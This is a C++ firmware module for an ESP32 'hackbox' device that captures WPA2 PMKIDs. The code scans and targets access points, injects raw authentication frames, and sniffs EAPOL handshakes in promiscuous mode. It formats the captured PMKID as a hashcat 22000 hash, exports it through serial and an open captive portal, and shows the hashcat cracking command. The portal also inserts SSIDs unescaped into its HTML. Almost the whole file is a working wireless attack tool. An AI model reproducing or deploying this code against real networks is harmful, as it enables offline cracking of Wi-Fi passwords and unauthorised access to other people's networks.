/*
    hackbox
    hackbox custom firmware

    PMKID Capture Tool
    Scan -> Select AP -> Send auth frame -> Capture PMKID from EAPOL Msg1
    -> Export via Serial (hashcat 22000) + WiFi AP captive portal download

    PMKID = HMAC-SHA1-128(PMK, "PMK Name" || MAC_AP || MAC_STA)
    No client deauth needed. Many APs include it in RSN IE of Message 1.
*/

#include "../include/pmkid_capture.h"
#include "../include/radio_manager.h"
#include "../include/sleep_manager.h"
#include "../include/display_mirror.h"
#include "../include/pindefs.h"
#include "../include/setting.h"
#include "../include/level_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include <WebServer.h>
#include <DNSServer.h>
#include <string.h>

extern U8G2_SSD1306_128X64_NONAME_F_HW_I2C u8g2;
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);

namespace {

// Writes a "# <label>: <value>" comment line to Serial with any CR
// or LF bytes in <value> replaced by '_'. Mirrors the same helper in
// handshake_capture.cpp -- the PMKID dumps are one-comment-per-line
// and a newline in an AP name would otherwise split the "# SSID:"
// header and break parsers tailing the serial stream.
void emitSafeComment(const char *label, const char *value) {
    Serial.print("# ");
    Serial.print(label);
    Serial.print(": ");
    for (const char *s = value; *s; ++s) {
        char c = *s;
        if (c == '\n' || c == '\r') c = '_';
        Serial.write((uint8_t)c);
    }
    Serial.println();
}

// ===== States =====
enum PMKIDState {
    PMKID_SCANNING,
    PMKID_SELECT_AP,
    PMKID_CAPTURE,
    PMKID_FOUND,
    PMKID_EXPORTING
};

PMKIDState currentState = PMKID_SCANNING;
bool needsRedraw = true;

// ===== AP List =====
struct APInfo {
    char ssid[33];
    uint8_t bssid[6];
    uint8_t channel;
    int8_t rssi;
};

const int MAX_APS = 30;
APInfo apList[MAX_APS];
int apCount = 0;
int selectedAP = 0;
int listOffset = 0;

// ===== PMKID Capture =====
uint8_t pmkid[16];
bool pmkidFound = false;
uint8_t staMac[6];
unsigned long captureStartTime = 0;
unsigned long lastAuthSend = 0;
const unsigned long AUTH_INTERVAL = 3000;
uint32_t authsSent = 0;

// ===== Export =====
WebServer pmkidServer(80);
DNSServer pmkidDNS;
esp_netif_t *pmkid_ap_netif = NULL;
bool exportRunning = false;

// Hashcat 22000 line buffer
char hashcatLine[256];

// ===== Auth Frame =====
// Open system authentication request (to trigger AP association/EAPOL Msg1)
uint8_t authFrame[30] = {
    0xB0, 0x00,                         // Frame control: Authentication
    0x00, 0x00,                         // Duration
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Dst: AP BSSID
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Src: STA MAC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence
    0x00, 0x00,                         // Auth algorithm: Open System
    0x01, 0x00,                         // Auth sequence: 1
    0x00, 0x00                          // Status: Success
};

void sendAuthFrame() {
    APInfo &ap = apList[selectedAP];

    // Get our STA MAC
    uint8_t mac[6];
    esp_wifi_get_mac(WIFI_IF_AP, mac);
    memcpy(staMac, mac, 6);

    memcpy(&authFrame[4], ap.bssid, 6);   // Destination = AP
    memcpy(&authFrame[10], mac, 6);       // Source = us
    memcpy(&authFrame[16], ap.bssid, 6);  // BSSID = AP

    uint16_t seq = random(4096) << 4;
    authFrame[22] = seq & 0xFF;
    authFrame[23] = (seq >> 8) & 0xFF;

    esp_wifi_80211_tx(WIFI_IF_AP, authFrame, sizeof(authFrame), false);
    authsSent++;
}

// Build hashcat 22000 format line
// WPA*02*pmkid_hex*mac_ap_hex*mac_sta_hex*essid_hex***
void buildHashcatLine() {
    APInfo &ap = apList[selectedAP];
    int pos = 0;

    pos += snprintf(&hashcatLine[pos], sizeof(hashcatLine) - pos, "WPA*02*");

    // PMKID hex
    for (int i = 0; i < 16; i++) {
        pos += snprintf(&hashcatLine[pos], sizeof(hashcatLine) - pos, "%02x", pmkid[i]);
    }
    pos += snprintf(&hashcatLine[pos], sizeof(hashcatLine) - pos, "*");

    // MAC AP hex
    for (int i = 0; i < 6; i++) {
        pos += snprintf(&hashcatLine[pos], sizeof(hashcatLine) - pos, "%02x", ap.bssid[i]);
    }
    pos += snprintf(&hashcatLine[pos], sizeof(hashcatLine) - pos, "*");

    // MAC STA hex
    for (int i = 0; i < 6; i++) {
        pos += snprintf(&hashcatLine[pos], sizeof(hashcatLine) - pos, "%02x", staMac[i]);
    }
    pos += snprintf(&hashcatLine[pos], sizeof(hashcatLine) - pos, "*");

    // ESSID hex
    int ssidLen = strlen(ap.ssid);
    for (int i = 0; i < ssidLen; i++) {
        pos += snprintf(&hashcatLine[pos], sizeof(hashcatLine) - pos, "%02x", (uint8_t)ap.ssid[i]);
    }
    pos += snprintf(&hashcatLine[pos], sizeof(hashcatLine) - pos, "***");
}

// ===== EAPOL Sniffer ,looking for PMKID in Message 1 =====
void IRAM_ATTR pmkidSniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA) return;
    if (pmkidFound) return;

    const wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *frame = pkt->payload;
    uint16_t len = pkt->rx_ctrl.sig_len;
    if (len < 36) return;

    // Check if this frame is from our target AP
    APInfo &ap = apList[selectedAP];
    bool fromAP = memcmp(&frame[10], ap.bssid, 6) == 0;
    if (!fromAP) return;

    // Data frame?
    uint8_t fc0 = frame[0];
    uint8_t ftype = (fc0 >> 2) & 0x03;
    uint8_t fsubtype = (fc0 >> 4) & 0x0F;
    if (ftype != 2) return;

    int hdrLen = 24;
    if (fsubtype & 0x08) hdrLen += 2; // QoS
    if (len < (uint16_t)(hdrLen + 8)) return;

    // Check LLC/SNAP for EAPOL ethertype 0x888E
    const uint8_t *llc = &frame[hdrLen];
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;
    uint16_t etherType = (llc[6] << 8) | llc[7];
    if (etherType != 0x888E) return;

    const uint8_t *eapol = &llc[8];
    // Use the 802.1X header's declared body length instead of sig_len-derived
    // size. sig_len includes the 4-byte FCS on most ESP-IDF builds. Not a
    // functional bug for PMKID (no MIC is computed) but prevents bounds
    // checks from using an inflated length.
    int available = len - hdrLen - 8;
    if (available < 4) return;
    int eapolLen = 4 + ((eapol[2] << 8) | eapol[3]);
    if (eapolLen < 99 || eapolLen > 256) return;
    if (eapolLen > available) return;

    // Must be EAPOL-Key
    uint8_t eapolType = eapol[1];
    if (eapolType != 3) return;

    uint16_t keyInfo = (eapol[5] << 8) | eapol[6];
    bool keyAck = (keyInfo >> 7) & 1;
    bool keyMIC = (keyInfo >> 8) & 1;

    // Message 1: AP -> STA, ACK set, MIC clear
    if (!keyAck || keyMIC) return;

    // Capture STA MAC from destination
    memcpy(staMac, &frame[4], 6);

    // Key Data Length is at offset 97-98 (big endian) in EAPOL-Key
    uint16_t keyDataLen = (eapol[97] << 8) | eapol[98];
    if (keyDataLen == 0) return;

    // Key Data starts at offset 99
    const uint8_t *keyData = &eapol[99];
    if (eapolLen < (int)(99 + keyDataLen)) return;

    // Parse Key Data for PMKID IE
    // Looking for: Type 0xDD, OUI 00:0F:AC, Data Type 04
    int offset = 0;
    while (offset + 2 <= (int)keyDataLen) {
        uint8_t tagType = keyData[offset];
        uint8_t tagLen = keyData[offset + 1];

        if (offset + 2 + tagLen > (int)keyDataLen) break;

        if (tagType == 0xDD && tagLen >= 20) {
            // Check OUI: 00:0F:AC and data type 04
            if (keyData[offset + 2] == 0x00 &&
                keyData[offset + 3] == 0x0F &&
                keyData[offset + 4] == 0xAC &&
                keyData[offset + 5] == 0x04) {
                // Found PMKID! Copy 16 bytes starting at offset+6
                memcpy(pmkid, &keyData[offset + 6], 16);
                pmkidFound = true;
                needsRedraw = true;
                return;
            }
        }

        offset += 2 + tagLen;
    }
}

// ===== Export Web Portal =====
const char* pmkidExportHTML PROGMEM = R"rawhtml(
<!DOCTYPE html>
<html>
<head>
<title>hackbox // pmkid</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050505;color:#00ff41;font-family:'Courier New',monospace;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{background:#0a0a0a;border:1px solid #0d2e0d;max-width:400px;width:100%;margin:16px;padding:32px;text-align:center}
h1{font-size:18px;letter-spacing:2px;margin-bottom:4px}
.sub{color:#008f11;font-size:11px;margin-bottom:24px}
.info{text-align:left;font-size:12px;margin-bottom:20px;line-height:2}
.info span{color:#008f11}
.hash{background:#111;border:1px solid #0d2e0d;padding:12px;font-size:10px;word-break:break-all;text-align:left;margin-bottom:20px;line-height:1.6}
.dl{display:inline-block;padding:14px 32px;background:#00ff41;color:#050505;font-family:inherit;font-size:14px;font-weight:bold;text-decoration:none;letter-spacing:1px;text-transform:uppercase}
.dl:hover{background:#00cc33}
.note{color:#0d2e0d;font-size:10px;margin-top:20px;line-height:1.5}
</style>
</head>
<body>
<div class="card">
<h1>hackbox</h1>
<div class="sub">pmkid captured</div>
<div class="info" id="info">Loading...</div>
<div class="hash" id="hash">Loading...</div>
<a class="dl" href="/download">Download .22000</a>
<div class="note">Open with hashcat:<br>hashcat -m 22000 capture.22000 wordlist.txt</div>
</div>
<script>
var x=new XMLHttpRequest();
x.open('GET','/info');
x.onload=function(){
  if(x.status===200){
    var d=JSON.parse(x.responseText);
    document.getElementById('info').innerHTML=
      '<span>SSID:</span> '+d.ssid+'<br>'+
      '<span>BSSID:</span> '+d.bssid+'<br>'+
      '<span>STA:</span> '+d.sta+'<br>'+
      '<span>PMKID:</span> '+d.pmkid;
    document.getElementById('hash').textContent=d.hashline;
  }
};
x.send();
</script>
</body>
</html>
)rawhtml";

void handleExportPage() {
    pmkidServer.send_P(200, "text/html", pmkidExportHTML);
}

void handleInfo() {
    APInfo &ap = apList[selectedAP];
    char bssid[18], sta[18], pmkidHex[33];
    snprintf(bssid, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             ap.bssid[0], ap.bssid[1], ap.bssid[2],
             ap.bssid[3], ap.bssid[4], ap.bssid[5]);
    snprintf(sta, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             staMac[0], staMac[1], staMac[2],
             staMac[3], staMac[4], staMac[5]);
    for (int i = 0; i < 16; i++) {
        snprintf(&pmkidHex[i * 2], 3, "%02X", pmkid[i]);
    }

    String json = "{\"ssid\":\"";
    json += ap.ssid;
    json += "\",\"bssid\":\"";
    json += bssid;
    json += "\",\"sta\":\"";
    json += sta;
    json += "\",\"pmkid\":\"";
    json += pmkidHex;
    json += "\",\"hashline\":\"";
    json += hashcatLine;
    json += "\"}";
    pmkidServer.send(200, "application/json", json);
}

void handleDownload() {
    pmkidServer.sendHeader("Content-Disposition", "attachment; filename=\"capture.22000\"");
    pmkidServer.send(200, "text/plain", hashcatLine);
}

void startExportAP() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(50);
    esp_wifi_deinit();
    delay(50);

    if (pmkid_ap_netif) { esp_netif_destroy(pmkid_ap_netif); pmkid_ap_netif = NULL; }
    pmkid_ap_netif = esp_netif_create_default_wifi_ap();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);

    wifi_config_t ap_config = {};
    strncpy((char*)ap_config.ap.ssid, "hackbox", sizeof(ap_config.ap.ssid) - 1);
    ap_config.ap.ssid[sizeof(ap_config.ap.ssid) - 1] = '\0';
    ap_config.ap.ssid_len = strlen((char*)ap_config.ap.ssid);
    ap_config.ap.channel = 1;
    ap_config.ap.authmode = WIFI_AUTH_OPEN;
    ap_config.ap.max_connection = 4;
    ap_config.ap.beacon_interval = 100;

    esp_wifi_set_config(WIFI_IF_AP, &ap_config);
    esp_wifi_start();
    delay(200);

    esp_netif_ip_info_t ip_info;
    if (esp_netif_get_ip_info(pmkid_ap_netif, &ip_info) == ESP_OK) {
        IPAddress apIP(ip_info.ip.addr);
        pmkidDNS.start(53, "*", apIP);
    }

    pmkidServer.on("/", handleExportPage);
    pmkidServer.on("/info", handleInfo);
    pmkidServer.on("/download", handleDownload);
    pmkidServer.on("/generate_204", handleExportPage);
    pmkidServer.on("/hotspot-detect.html", handleExportPage);
    pmkidServer.on("/connecttest.txt", handleExportPage);
    pmkidServer.on("/redirect", handleExportPage);
    pmkidServer.on("/canonical.html", handleExportPage);
    pmkidServer.on("/success.txt", handleExportPage);
    pmkidServer.onNotFound(handleExportPage);
    pmkidServer.begin();
    exportRunning = true;
}

// ===== Display =====
void drawScreen() {
    u8g2.clearBuffer();
    u8g2.setFont(u8g2_font_5x8_tr);

    switch (currentState) {
        case PMKID_SCANNING: {
            u8g2.drawStr(0, 8, "PMKID - Scanning...");
            char buf[32];
            snprintf(buf, sizeof(buf), "Found: %d APs", apCount);
            u8g2.drawStr(0, 20, buf);
            u8g2.drawStr(0, 62, "Please wait...");
            break;
        }
        case PMKID_SELECT_AP: {
            u8g2.drawStr(0, 8, "Select Target AP:");
            u8g2.drawHLine(0, 10, 128);
            if (apCount == 0) {
                u8g2.drawStr(0, 28, "No WPA2 APs found");
                u8g2.drawStr(0, 40, "R=Rescan");
                u8g2.drawStr(0, 62, "L=Exit");
            } else {
                for (int i = 0; i < 5 && (listOffset + i) < apCount; i++) {
                    int idx = listOffset + i;
                    APInfo &a = apList[idx];
                    char line[28];
                    char maskedSSID[20];
                    if (privacyModeEnabled) {
                        snprintf(maskedSSID, sizeof(maskedSSID), "****");
                    } else {
                        strncpy(maskedSSID, a.ssid, 14);
                        maskedSSID[14] = '\0';
                    }
                    snprintf(line, sizeof(line), "%s%-14s %ddBm",
                             idx == selectedAP ? ">" : " ", maskedSSID, a.rssi);
                    u8g2.drawStr(0, 20 + (i * 9), line);
                }
                u8g2.drawStr(0, 62, "U/D=Scroll R=Select");
            }
            break;
        }
        case PMKID_CAPTURE: {
            APInfo &a = apList[selectedAP];
            char buf[32];
            u8g2.drawStr(0, 8, "Waiting for PMKID...");
            u8g2.drawHLine(0, 10, 128);

            snprintf(buf, sizeof(buf), "AP: %.16s", a.ssid);
            u8g2.drawStr(0, 20, buf);
            snprintf(buf, sizeof(buf), "Ch: %d  Auths: %lu", a.channel, (unsigned long)authsSent);
            u8g2.drawStr(0, 30, buf);

            snprintf(buf, sizeof(buf), "BSSID: %02X:%02X:%02X:%02X:%02X:%02X",
                     a.bssid[0], a.bssid[1], a.bssid[2],
                     a.bssid[3], a.bssid[4], a.bssid[5]);
            u8g2.drawStr(0, 42, buf);

            unsigned long elapsed = (millis() - captureStartTime) / 1000;
            snprintf(buf, sizeof(buf), "Time: %lus", elapsed);
            u8g2.drawStr(0, 52, buf);

            u8g2.drawStr(0, 62, "L=Abort  Waiting...");
            break;
        }
        case PMKID_FOUND: {
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 10, "PMKID CAPTURED!");
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawHLine(0, 12, 128);

            APInfo &a = apList[selectedAP];
            char buf[32];
            snprintf(buf, sizeof(buf), "SSID: %.18s", a.ssid);
            u8g2.drawStr(0, 22, buf);

            // Show PMKID in two lines of 8 bytes each
            char hex1[25], hex2[25];
            snprintf(hex1, sizeof(hex1), "%02X%02X%02X%02X%02X%02X%02X%02X",
                     pmkid[0], pmkid[1], pmkid[2], pmkid[3],
                     pmkid[4], pmkid[5], pmkid[6], pmkid[7]);
            snprintf(hex2, sizeof(hex2), "%02X%02X%02X%02X%02X%02X%02X%02X",
                     pmkid[8], pmkid[9], pmkid[10], pmkid[11],
                     pmkid[12], pmkid[13], pmkid[14], pmkid[15]);
            u8g2.drawStr(0, 32, hex1);
            u8g2.drawStr(0, 40, hex2);

            u8g2.drawStr(0, 52, "R=Export  D=Serial");
            u8g2.drawStr(0, 62, "L=Back");
            break;
        }
        case PMKID_EXPORTING: {
            u8g2.setFont(u8g2_font_6x10_tr);
            u8g2.drawStr(0, 10, "EXPORT READY");
            u8g2.setFont(u8g2_font_5x8_tr);
            u8g2.drawHLine(0, 12, 128);

            u8g2.drawStr(0, 24, "Connect to WiFi:");
            u8g2.drawStr(0, 34, "hackbox");
            u8g2.drawStr(0, 46, "Auto-popup or open");
            u8g2.drawStr(0, 54, "192.168.4.1");
            u8g2.drawStr(0, 62, "L=Back");
            break;
        }
    }

    u8g2.sendBuffer();
    displayMirrorSend(u8g2);
}

// ===== Scan =====
void startScan() {
    apCount = 0;
    currentState = PMKID_SCANNING;
    needsRedraw = true;
    drawScreen();

    initWiFi(WIFI_MODE_STA);

    wifi_scan_config_t scanCfg = {};
    scanCfg.scan_type = WIFI_SCAN_TYPE_ACTIVE;
    scanCfg.scan_time.active.min = 120;
    scanCfg.scan_time.active.max = 300;
    esp_wifi_scan_start(&scanCfg, true); // blocking scan

    uint16_t num = 0;
    esp_wifi_scan_get_ap_num(&num);
    if (num > MAX_APS) num = MAX_APS;

    wifi_ap_record_t *records = (wifi_ap_record_t*)malloc(sizeof(wifi_ap_record_t) * num);
    if (records) {
        esp_wifi_scan_get_ap_records(&num, records);
        for (int i = 0; i < num; i++) {
            if (records[i].authmode == WIFI_AUTH_OPEN) continue; // Skip open networks
            strncpy(apList[apCount].ssid, (char*)records[i].ssid, 32);
            apList[apCount].ssid[32] = '\0';
            memcpy(apList[apCount].bssid, records[i].bssid, 6);
            apList[apCount].channel = records[i].primary;
            apList[apCount].rssi = records[i].rssi;
            apCount++;
        }
        free(records);
    }

    selectedAP = 0;
    listOffset = 0;
    currentState = PMKID_SELECT_AP;
    needsRedraw = true;
}

void startCapture() {
    APInfo &ap = apList[selectedAP];

    pmkidFound = false;
    authsSent = 0;
    memset(pmkid, 0, sizeof(pmkid));
    memset(hashcatLine, 0, sizeof(hashcatLine));

    // Switch to AP mode for reliable promiscuous + raw TX
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    delay(100);
    esp_wifi_set_mode(WIFI_MODE_AP);
    esp_wifi_start();
    delay(100);

    // Lock to target channel
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);

    // Enable promiscuous - capture both data AND management frames
    wifi_promiscuous_filter_t filter;
    filter.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(pmkidSniffer);
    esp_wifi_set_promiscuous(true);

    captureStartTime = millis();
    lastAuthSend = 0;
    currentState = PMKID_CAPTURE;
    needsRedraw = true;
}

}

// ===== Public API =====

void pmkidCaptureSetup() {
    currentState = PMKID_SCANNING;
    needsRedraw = true;
    pmkidFound = false;
    exportRunning = false;
    pmkid_ap_netif = NULL;

    esp_netif_init();
    esp_event_loop_create_default();

    pinMode(BUTTON_PIN_UP, INPUT_PULLUP);
    pinMode(BUTTON_PIN_DOWN, INPUT_PULLUP);
    pinMode(BUTTON_PIN_LEFT, INPUT_PULLUP);
    pinMode(BUTTON_PIN_RIGHT, INPUT_PULLUP);

    startScan();
}

void pmkidCaptureLoop() {
    unsigned long now = millis();

    static bool upPrev = false, downPrev = false, rightPrev = false, leftPrev = false;
    bool upNow = digitalRead(BUTTON_PIN_UP) == LOW;
    bool downNow = digitalRead(BUTTON_PIN_DOWN) == LOW;
    bool rightNow = digitalRead(BUTTON_PIN_RIGHT) == LOW;
    bool leftNow = digitalRead(BUTTON_PIN_LEFT) == LOW;

    if (exportRunning) {
        pmkidDNS.processNextRequest();
        pmkidServer.handleClient();
    }

    switch (currentState) {
        case PMKID_SELECT_AP:
            if (upNow && !upPrev && apCount > 0) {
                selectedAP--;
                if (selectedAP < 0) selectedAP = apCount - 1;
                if (selectedAP < listOffset) listOffset = selectedAP;
                needsRedraw = true;
                delay(150);
            }
            if (downNow && !downPrev && apCount > 0) {
                selectedAP++;
                if (selectedAP >= apCount) selectedAP = 0;
                if (selectedAP >= listOffset + 5) listOffset = selectedAP - 4;
                if (selectedAP == 0) listOffset = 0;
                needsRedraw = true;
                delay(150);
            }
            if (rightNow && !rightPrev) {
                if (apCount > 0) {
                    startCapture();
                } else {
                    cleanupWiFi();
                    delay(100);
                    startScan();
                }
                delay(200);
            }
            break;

        case PMKID_CAPTURE:
            // Send auth frame periodically to trigger EAPOL Msg1
            if (!pmkidFound && now - lastAuthSend >= AUTH_INTERVAL) {
                lastAuthSend = now;
                sendAuthFrame();
                needsRedraw = true;
            }
            // Check if PMKID was captured
            if (pmkidFound) {
                esp_wifi_set_promiscuous(false);
                buildHashcatLine();
                addXP(15);
                currentState = PMKID_FOUND;
                needsRedraw = true;

                // Auto-print to serial
                Serial.println("# hackbox PMKID capture");
                emitSafeComment("SSID", apList[selectedAP].ssid);
                Serial.print("# Hashcat 22000: ");
                Serial.println(hashcatLine);
            }
            if (leftNow && !leftPrev) {
                esp_wifi_set_promiscuous(false);
                currentState = PMKID_SELECT_AP;
                needsRedraw = true;
                delay(200);
            }
            break;

        case PMKID_FOUND:
            if (rightNow && !rightPrev) {
                startExportAP();
                currentState = PMKID_EXPORTING;
                needsRedraw = true;
                delay(200);
            }
            if (downNow && !downPrev) {
                // Dump to serial
                Serial.println("# hackbox PMKID capture - hashcat 22000");
                emitSafeComment("SSID", apList[selectedAP].ssid);
                Serial.println(hashcatLine);
                Serial.println("# END");
                needsRedraw = true;
                delay(200);
            }
            if (leftNow && !leftPrev) {
                currentState = PMKID_SELECT_AP;
                needsRedraw = true;
                delay(200);
            }
            break;

        case PMKID_EXPORTING:
            if (leftNow && !leftPrev) {
                pmkidServer.stop();
                pmkidDNS.stop();
                exportRunning = false;
                currentState = PMKID_FOUND;
                needsRedraw = true;
                delay(200);
            }
            break;

        default:
            break;
    }

    upPrev = upNow;
    downPrev = downNow;
    rightPrev = rightNow;
    leftPrev = leftNow;

    if (needsRedraw) {
        needsRedraw = false;
        drawScreen();
    }
}

void cleanupPmkidCapture() {
    if (exportRunning) {
        pmkidServer.stop();
        pmkidDNS.stop();
        exportRunning = false;
    }
    esp_wifi_set_promiscuous(false);
    cleanupWiFi();
    pmkid_ap_netif = NULL;
}
